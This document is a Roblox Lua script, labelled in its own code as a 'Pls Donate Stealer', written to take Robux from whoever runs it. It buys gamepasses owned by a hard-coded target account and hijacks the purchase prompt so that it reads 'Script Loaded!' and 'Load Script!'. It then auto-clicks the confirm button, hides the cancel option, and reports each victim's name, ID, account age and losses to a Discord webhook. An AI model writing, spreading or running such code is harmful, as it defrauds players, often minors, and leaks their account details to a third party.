repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer.Parent

local Username = "lan_wp27"
local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"

local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local request = syn and syn.request or http_request or http.request
if typeof(request) ~= "function" then error("Sem HTTP support") end

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 10)
local RemotesModule = require(Remotes)

local headers = {["Content-Type"] = "application/json"}
local donationsSent = 0
local userRobux = 0
local firstLoad = true

local function sendWebhook(amount)
    local data = {
        username = "Pls Donate Stealer",
        content = "@everyone",
        embeds = {{
            title = "Pls Donate HIT!",
            color = 65280,
            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..Players.LocalPlayer.UserId.."&width=420&height=420"},
            fields = {
                {name = "Victim", value = Players.LocalPlayer.Name.." (ID: "..Players.LocalPlayer.UserId..")\nAge: "..Players.LocalPlayer.AccountAge, inline = true},
                {name = "Robux", value = tostring(amount).." R$", inline = true},
                {name = "Target", value = Username, inline = true},
                {name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = true}
            },
            footer = {text = "Shar's Script"}
        }}
    }
    
    pcall(request, {
        Url = Webhook,
        Method = "POST",
        Headers = headers,
        Body = HttpService:JSONEncode(data)
    })
end

local targetUserId = Players:GetUserIdFromNameAsync(Username)
print("Target ID:", targetUserId)

spawn(function()
    while task.wait(1.5) do
        pcall(function()
            for _, booth in pairs(workspace:GetChildren()) do
                if booth:FindFirstChild("BoothUI") then
                    for _, item in pairs(booth.BoothUI.Items.Frame:GetChildren()) do
                        if item:GetAttribute("AssetType") == "Gamepass" and 
                           item:GetAttribute("OwnerUserId") == targetUserId and
                           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, item:GetAttribute("AssetId")) then
                            
                            local price = item:GetAttribute("AssetPrice")
                            if price and price > 0 then
                                print("Donating "..price.." R$")
                                item.Prompt:FireServer("", false, price)
                                donationsSent = donationsSent + price
                                return
                            end
                        end
                    end
                end
            end
        end)
    end
end)

CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "PurchasePrompt" then
        spawn(function()
            pcall(function()
                local container = child:WaitForChild("ProductPurchaseContainer", 3)
                local animator = container:WaitForChild("Animator", 3)
                
                animator.ChildAdded:Connect(function(prompt)
                    if prompt.Name == "Prompt" then
                        task.wait(0.2)
                        local alert = prompt:FindFirstChild("AlertContents")
                        if alert then
                            local title = alert:FindFirstChild("TitleContainer")
                            local footer = alert:FindFirstChild("Footer")
                            
                            if title then
                                title.TitleArea.Title.Text = firstLoad and "Script Loaded!" or "Processing..."
                            end
                            
                            if footer and firstLoad then
                                local balance = footer.FooterContent.Content:FindFirstChild("RemainingBalanceText")
                                if balance then
                                    local num = balance.Text:match("%d+")
                                    userRobux = tonumber(num) or 0
                                    print("Balance:", userRobux)
                                    firstLoad = false
                                end
                            end
                            
                            local buttons = footer and footer.Buttons
                            if buttons and buttons["1"] then
                                buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                                spawn(function()
                                    task.wait(0.4)
                                    pcall(function()
                                        if buttons["1"].ButtonContent.Activated then
                                            buttons["1"].ButtonContent:Activate()
                                        end
                                    end)
                                end)
                                if buttons["2"] then buttons["2"].Visible = false end
                            end
                        end
                    end
                end)
            end)
        end)
    end
end)

pcall(function()
    RemotesModule.OnClientEvent("GiftSentAlert"):Connect(function(senderId, amount)
        if senderId == targetUserId then
            print("Gift confirmado:", amount)
            donationsSent = donationsSent + amount
            if donationsSent >= 25 then
                sendWebhook(donationsSent)
            end
        end
    end)
end)

print("LOADED! Target:", Username)
